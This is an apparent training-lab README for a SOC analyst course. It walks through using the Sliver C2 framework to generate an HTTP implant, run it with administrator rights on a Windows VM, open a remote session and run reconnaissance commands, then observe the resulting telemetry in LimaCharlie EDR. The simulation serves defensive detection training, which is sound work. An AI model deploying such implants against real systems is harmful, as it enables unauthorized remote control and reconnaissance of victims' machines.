# Sliver Setup

This document outlines the process of preparing and using the **Sliver Command and Control (C2)** framework to simulate adversarial activity as part of the SOC Analyst 2.0 Lab.

## Overview
The lab uses Sliver to create and deploy payloads (C2 implants) that simulate real-world adversarial behavior. These implants establish Command and Control sessions with the Sliver server, enabling activities like privilege escalation, credential dumping, and system reconnaissance.

---

## Steps for Sliver Setup

### 1. Generate the C2 Implant
The Sliver C2 server is pre-installed for this lab. Follow these steps to generate and deploy your C2 implant:
1. Start the **Sliver Client** from the terminal.
2. Generate the C2 implant using the following command:
   
   generate --http 172.25.114.254 --save /mnt/c/Users/sywtbsa/Downloads/
   
   - `--http`: Specifies the communication protocol.
   - Replace `172.25.114.254` with the Sliver server's IP address.
   - The implant is saved in the Windows system's Downloads directory.

3. Verify the implant is stored on the Sliver server:
   
   implants
   
   - This command lists the available implants.

4. Ensure the HTTP listener is running:
   
   jobs
   
   - If the job isn’t running, start it by typing `http` in the Sliver client terminal.

---

### 2. Start a Command and Control (C2) Session
After generating the implant:
1. Launch an **Administrative Command Prompt** on the target Windows VM.
   - Ensure this is run with Administrator privileges.
2. Execute the implant:
   
   C:\Users\sywtbsa\Downloads\[your_C2-implant.exe]
   
   - Replace `[your_C2-implant.exe]` with the actual payload name.

3. Confirm the session has been established:
   
   sessions
   
   - This command lists active C2 sessions on the Sliver server.

4. Interact with the session:
   
   use [session_id]
   
   - Replace `[session_id]` with the active session’s ID.
   - Once active, you can run commands on the compromised system.

---

## Commands to Explore
1. **Basic Information**:
   - Get system and session details:
     
     info
     whoami
     pwd
     

2. **Network Reconnaissance**:
   - View active network connections:
     
     netstat
     

3. **Process Exploration**:
   - List running processes:
     
     ps -T
     
   - Sliver highlights its own implant in green and defensive tools in red.

---

## Observing EDR Telemetry
With the implant active, use LimaCharlie to observe telemetry data:
1. Log in to the [LimaCharlie web UI](https://app.limacharlie.io/).
2. Navigate to:
   - **Sensors**: View active sensors.
   - **Processes**: Explore the process tree, noting signed vs. unsigned processes.
   - **Network**: Examine network activity for the implant.
   - **File System**: Locate the implant in `C:\Users\sywtbsa\Downloads` and inspect its hash (e.g., with VirusTotal).
   - **Timeline**: Review event logs and telemetry related to the implant's creation and execution.
